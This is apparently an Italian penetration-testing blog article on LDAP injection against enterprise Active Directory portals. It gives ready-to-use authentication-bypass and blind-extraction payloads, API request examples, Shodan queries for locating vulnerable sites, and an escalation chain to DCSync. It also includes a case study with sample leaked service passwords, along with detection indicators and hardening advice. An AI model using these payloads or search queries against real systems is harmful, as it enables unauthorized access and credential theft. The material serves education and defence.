---
title: 'LDAP Injection: Bypass Autenticazione Active Directory e Enumerazione Utenti'
slug: ldap-injection
description: >-
  Scopri come sfruttare una LDAP Injection nei portali enterprise: bypass
  autenticazione Active Directory, enumerazione utenti e estrazione attributi
  sensibili dalla directory aziendale.
image: /ldap-injection.webp
draft: false
date: 2026-03-16T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - ldap
  - ad
---

Ogni grande azienda usa LDAP. Letteralmente ogni grande azienda. Active Directory, OpenLDAP, FreeIPA — il protocollo LDAP è il cuore dell'autenticazione e della gestione utenti in ambiente enterprise. Quando un dipendente inserisce username e password nel portale aziendale — webmail, VPN portal, intranet, helpdesk, CRM — l'applicazione spesso verifica le credenziali con una **query LDAP** verso il Domain Controller. Se quella query è costruita concatenando l'input dell'utente senza sanitizzazione, l'attaccante può manipolare la logica del filtro LDAP esattamente come nella SQL Injection si manipola la query SQL.

La differenza fondamentale è il target: nella SQLi attacchi un database, nella LDAP Injection attacchi **Active Directory** — il sistema che controlla tutti gli utenti, tutti i gruppi, tutte le policy di un'intera organizzazione. Un bypass dell'autenticazione LDAP non ti dà accesso a una tabella: ti dà accesso alla directory aziendale.

La trovo nel **8% dei pentest su portali con autenticazione AD/LDAP** — una percentuale che sembra bassa ma il target è sempre di alto valore. Ogni LDAP Injection trovata ha portato a un impatto significativo.

Satellite operativo della [guida pillar Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche la guida [Porta 389 LDAP](https://hackita.it/articoli/porta-389-ldap) per l'exploitation diretta del servizio.

## Cos'è la LDAP Injection?

La LDAP Injection è una vulnerabilità in cui l'input dell'utente viene inserito in un **filtro LDAP** senza sanitizzazione, permettendo all'attaccante di modificare la logica della query. I filtri LDAP usano una sintassi specifica con parentesi e operatori (`&`, `|`, `!`, `*`) e l'iniezione di questi caratteri altera il significato della query — tipicamente per bypassare l'autenticazione, enumerare utenti o estrarre attributi dalla directory.

> **La LDAP Injection è pericolosa?**
> Sì — porta al **bypass dell'autenticazione** (login senza password), all'**enumerazione completa degli utenti** Active Directory (nomi, email, gruppi, descrizioni), e all'**estrazione di attributi sensibili** (telefono, indirizzo, password nel campo description). L'impatto è l'accesso alla directory aziendale. Trovata nel **8% dei pentest** su portali con autenticazione LDAP.

## Come Verificare se Sei Vulnerabile

```bash
# Shodan — portali con errori LDAP esposti
"LDAP error" port:80,443
"ldap_bind" "error" port:80,443
"Invalid DN syntax" port:80,443

# Test manuale rapido
username: *
# Se il login risponde diversamente (errore diverso, o "multiple users found") → wildcard funziona → possibile LDAP Injection
```

## Anatomia di un Filtro LDAP

Prima di attaccare, serve capire la struttura. LDAP usa **filtri con notazione prefix** (polacca):

```
# Filtro di autenticazione tipico:
(&(uid=USERNAME)(userPassword=PASSWORD))

# Significato: AND(uid=USERNAME, password=PASSWORD)
# L'utente viene autenticato se ENTRAMBE le condizioni sono vere
```

Gli operatori LDAP:

* `&` → AND (tutte le condizioni devono essere vere)
* `|` → OR (almeno una condizione vera)
* `!` → NOT (negazione)
* `*` → Wildcard (qualsiasi valore)
* `()` → Raggruppamento

Ogni condizione è racchiusa in parentesi: `(uid=admin)`. Gli operatori precedono le condizioni: `(&(cond1)(cond2))`.

## Authentication Bypass

### Caso 1: Filtro AND con due condizioni

```python
# Codice vulnerabile
ldap_filter = f"(&(uid={username})(userPassword={password}))"
```

**Bypass con chiusura prematura:**

```
Username: admin)(&)
Password: qualsiasi

# Il filtro diventa: (&(uid=admin)(&))(userPassword=qualsiasi))
# (&) = TRUE sempre → autenticazione bypassata per "admin"
```

**Bypass con OR injection:**

```
Username: admin)(|(uid=*
Password: qualsiasi

# Il filtro diventa: (&(uid=admin)(|(uid=*)(userPassword=qualsiasi)))
# (uid=*) = TRUE per tutti → OR è TRUE → autenticazione bypassata
```

### Caso 2: Filtro con wildcard

```
Username: *
Password: *

# Filtro: (&(uid=*)(userPassword=*))
# Match su TUTTI gli utenti con qualsiasi password → login come il primo utente (spesso admin)
```

### Caso 3: Ignorare il campo password

```
Username: admin)(%26)
Password: qualsiasi

# %26 = & (URL-encoded)
# Filtro: (&(uid=admin)(&))(userPassword=qualsiasi))
# La seconda condizione è (&) che è sempre TRUE
```

## Enumerazione Utenti

Se il portale mostra messaggi diversi per "utente non trovato" vs "password errata", posso enumerare gli utenti:

```
Username: a*        → "password errata" = esistono utenti che iniziano per 'a'
Username: ad*       → "password errata" = esistono utenti che iniziano per 'ad'
Username: adm*      → "password errata" = esiste 'admin' o simili
Username: admin     → "password errata" = 'admin' esiste!

Username: b*        → "utente non trovato" = nessun utente inizia per 'b'
```

Character by character, esattamente come nella [Blind SQLi](https://hackita.it/articoli/blind-sql-injection).

## Blind LDAP Injection

Se la risposta non rivela informazioni dirette, uso le differenze comportamentali:

```
# TRUE condition — pagina A
admin)(&(uid=admin)     → login page con messaggio "password errata"

# FALSE condition — pagina B
admin)(&(uid=inesistente) → login page con messaggio "utente non trovato"

# Extraction — il primo carattere della description è 'P'?
admin)(description=P*    → se "password errata" → il campo description di admin inizia per 'P'
```

Questo permette di estrarre **qualsiasi attributo LDAP** dell'utente: `description`, `telephoneNumber`, `memberOf`, `mail`, `title`.

## Estrazione Attributi Sensibili

In Active Directory, il campo `description` degli utenti è il posto dove trovo più spesso password scritte in chiaro. È una best practice orribile ma incredibilmente comune — "password temporanea per l'utente, la cambierà al primo login" (e non la cambia mai).

```
# Estrai description character by character
admin)(description=a*     → FALSE
admin)(description=P*     → TRUE → primo char = 'P'
admin)(description=Pa*    → TRUE → secondo char = 'a'
admin)(description=Pas*   → TRUE
admin)(description=Pass*  → TRUE
...
admin)(description=Password123!* → TRUE → description = "Password123!"
```

## 🏢 Enterprise Escalation

```
LDAP Injection su portale VPN → bypass auth come admin
→ enumera tutti gli utenti AD via wildcard
→ estrai description di ogni utente → password in chiaro
→ password spray con le password trovate → accesso a più account
→ account con privilegi Domain Admin → DCSync → game over
```

**Tempo reale:** 1-3 ore.

## 🔌 Variante API / Microservizi 2026

```json
// API di autenticazione con LDAP backend
POST /api/v2/auth/login
{"username": "admin)(&)", "password": "anything"}

// API di ricerca utenti
POST /api/v2/users/search
{"query": "*)(memberOf=CN=Domain Admins,CN=Users,DC=company,DC=local"}
// → lista tutti i Domain Admin

// API di directory lookup
GET /api/v2/directory/lookup?name=*)(telephoneNumber=*
// → enumera tutti gli utenti con numero di telefono
```

## Micro Playbook Reale

**Minuto 0-3 →** Testa `*` come username. Se il comportamento cambia → LDAP Injection.
**Minuto 3-10 →** Bypass autenticazione: `admin)(&)`, `admin)(|(uid=*`
**Minuto 10-30 →** Enumerazione utenti con wildcard: `a*`, `b*`, ... `z*`
**Minuto 30-60 →** Estrazione `description` degli utenti chiave
**Minuto 60+ →** Password spray con le password trovate

## Caso Studio Concreto

**Settore:** Studio legale, 300 dipendenti, portale webmail OWA-like custom.
**Scope:** Black-box.

Login form con username/password. `*` come username → "multiple users found" (errore diverso dal solito "invalid credentials"). LDAP Injection confermata. `admin)(&)` come username → accesso alla webmail dell'account admin.

Dalla webmail admin, accesso alla rubrica con 300 utenti. Enumerazione sistematica con wildcard injection → lista completa di tutti gli utenti con email e ruolo. Blind LDAP extraction del campo `description` sui 15 utenti con ruolo "IT" → 3 avevano password nel campo description: `svc_backup: BackupAdmin2023!`, `svc_print: PrintServ!ce`, `admin.it: P@ssw0rd!Q4`.

`svc_backup` era Domain Admin (per i backup di Active Directory aveva bisogno di quei privilegi). Login RDP con quelle credenziali → DCSync → tutti gli hash del dominio.

**Tempo dalla LDAP Injection al Domain Admin:** 2 ore. **Il campo description conteneva password nel 20% degli account di servizio.**

## Errori Comuni Reali

**1. Filtri LDAP concatenati (il pattern universale)**
`f"(&(uid={input})(password={input}))"` — stessa causa della SQLi: concatenazione stringa.

**2. Wildcard permessa**
`*` come input non viene filtrato → enumerazione completa.

**3. Messaggi di errore diversi** per utente inesistente vs password errata → enumerazione.

**4. Password nel campo description di AD** — trovate nel 20% degli account di servizio.

**5. Anonymous bind permesso** — il server LDAP permette query senza autenticazione.

## Indicatori di Compromissione (IoC)

* Query LDAP con `*`, `)(`, `|`, `!` nei log del directory server
* Numero anomalo di bind LDAP dallo stesso IP in poco tempo
* Query LDAP con filtri complessi non generati dall'applicazione
* Accesso sequenziale con username `a*`, `b*`, ... `z*` (enumerazione)
* Bind riuscito con filtri malformati

## Mini Chain Offensiva Reale

```
LDAP Injection (*) → Auth Bypass → User Enumeration → Description Extraction → Password svc_backup → Domain Admin → DCSync
```

## Detection & Hardening

* **Escape caratteri speciali LDAP**: `*`, `(`, `)`, `\`, `NUL`, `/`
* **Usa funzioni LDAP parametrizzate** della libreria (ldap3 in Python, Spring LDAP in Java)
* **Whitelist input** — username: solo alfanumerici e `._-`
* **Stesso messaggio** per utente inesistente e password errata
* **Non usare il campo description per password** — mai, per nessun motivo
* **Disabilita anonymous bind** sul Domain Controller

***

Satellite della [Guida Completa Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche: [Porta 389 LDAP](https://hackita.it/articoli/porta-389-ldap), [XPath Injection](https://hackita.it/articoli/xpath-injection).

> I tuoi portali aziendali autenticano via LDAP? [Penetration test HackIta](https://hackita.it/servizi). Per padroneggiare la LDAP Injection: [formazione 1:1](https://hackita.it/formazione).
